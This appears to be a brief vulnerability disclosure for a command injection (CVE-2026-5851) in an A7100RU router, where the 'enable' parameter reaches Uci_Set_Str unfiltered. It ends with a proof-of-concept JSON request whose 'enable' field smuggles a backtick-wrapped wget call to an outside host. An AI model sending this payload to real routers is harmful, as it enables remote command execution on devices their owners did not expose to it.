# A7100RU Vulnerability（CVE-2026-5851）
...
In  sub_425090 function, it reads in a user-provided parameter `enable` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
{"topicurl":"setUPnPCfg",
"enable":"`wget 192.168.6.1:7777/testpoc`"}
```
